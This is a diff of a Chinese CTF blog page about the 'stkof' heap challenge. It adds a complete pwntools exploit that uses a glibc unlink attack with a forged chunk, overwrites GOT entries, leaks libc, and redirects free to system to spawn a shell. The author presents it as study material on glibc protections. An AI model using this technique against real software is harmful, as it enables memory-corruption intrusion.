@@ -72,7 +72,7 @@
 
     
         <meta property="article:published_time" content="11月 16, 2018" />
-        <meta property="article:modified_time" content="11月 17, 2018" />
+        <meta property="article:modified_time" content="11月 18, 2018" />
     
 
     <!-- The Twitter Card protocol -->
@@ -113,7 +113,7 @@
     "headline": "unlink-stkof",
     "url": "http://iosmosis.github.io/2018/11/16/unlink-stkof/index.html",
     "datePublished": "11月 16, 2018",
-    "dateModified": "11月 17, 2018",
+    "dateModified": "11月 18, 2018",
     "description": "",
     "mainEntityOfPage": {
         "@type": "WebPage",
@@ -343,7 +343,7 @@
 
     
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#glibc中的保护机制（ubuntu18-04堆有做修改）"><span class="post-toc-number">1.</span> <span class="post-toc-text">glibc中的保护机制（ubuntu18.04堆有做修改）</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查看题目-stkof"><span class="post-toc-number"></span> <span class="post-toc-text">查看题目 stkof</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#alloc"><span class="post-toc-number">1.</span> <span class="post-toc-text">alloc</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#edite"><span class="post-toc-number">2.</span> <span class="post-toc-text">edite</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#delete"><span class="post-toc-number">3.</span> <span class="post-toc-text">delete</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#构造思路"><span class="post-toc-number">4.</span> <span class="post-toc-text">构造思路</span></a></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#glibc中的保护机制（ubuntu18-04堆有做修改）"><span class="post-toc-number">1.</span> <span class="post-toc-text">glibc中的保护机制（ubuntu18.04堆有做修改）</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查看题目-stkof"><span class="post-toc-number"></span> <span class="post-toc-text">查看题目 stkof</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#alloc"><span class="post-toc-number">1.</span> <span class="post-toc-text">alloc</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#edite"><span class="post-toc-number">2.</span> <span class="post-toc-text">edite</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#delete"><span class="post-toc-number">3.</span> <span class="post-toc-text">delete</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#构造思路"><span class="post-toc-number">4.</span> <span class="post-toc-text">构造思路</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp"><span class="post-toc-number">5.</span> <span class="post-toc-text">exp</span></a></li></ol>
         <!--
         <li class="mdl-menu__item">
             Some Action
@@ -892,6 +892,69 @@ read_in<span class="token punctuation">(</span><span class="token number">4</spa
 free_it<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./stkof'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'stkof'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"OK\n"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">read_in</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OK\n'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">free_it</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
+ptr <span class="token operator">=</span> <span class="token number">0x602140</span> <span class="token operator">+</span><span class="token number">0x10</span>
+alloc<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 1</span>
+alloc<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 2</span>
+alloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 3</span>
+alloc<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 4</span>
+
+
+payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake chunk pre_size</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake chunk size</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ptr<span class="token number">-0x18</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake fd</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fake bk</span>
+payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#overflow fake chunk</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#overflow next chunk pre_size size</span>
+
+read_in<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+free_it<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OK\n'</span><span class="token punctuation">)</span>
+payload1 <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+read_in<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>
+read_in<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+free_it<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+
+data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\nOK\n'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
+
+
+<span class="token comment" spellcheck="true">#puts_addr = u64(p.recvuntil("\nOK\n",drop = True).ljust(8,'\x00'))</span>
+<span class="token comment" spellcheck="true">#print hex(puts_addr)</span>
+system <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#binsh = puts - libc.symbols['puts']+next(libc.search('/bin/sh'))</span>
+read_in<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># free_got => system_got</span>
+read_in<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
+free_it<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
 <p>成功getshell  此题只用与学习unlink操作 以及学习glibc保护机制<br>由于ubuntu18.04中对堆操作进行了修改 所以此unlink.py在ubuntu18.04中无法成功leak  在malloc4个smallchunk后出现和并（继续研究～）</p>
 
     
@@ -925,6 +988,14 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
+    
+        <a href="/2018/11/18/kernel-core/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
     
 </nav>
 
@@ -1010,7 +1081,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
             </a>
             <ul class="dropdown-menu">
             <li>
-                <a class="sidebar_archives-link" href="/archives/2018/11/">十一月 2018<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/10/">十月 2018<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/08/">八月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/07/">七月 2018<span class="sidebar_archives-count">6</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">四月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/03/">三月 2017<span class="sidebar_archives-count">2</span></a>
+                <a class="sidebar_archives-link" href="/archives/2018/11/">十一月 2018<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/10/">十月 2018<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/08/">八月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/07/">七月 2018<span class="sidebar_archives-count">6</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">四月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/03/">三月 2017<span class="sidebar_archives-count">2</span></a>
             </ul>
         </li>
         
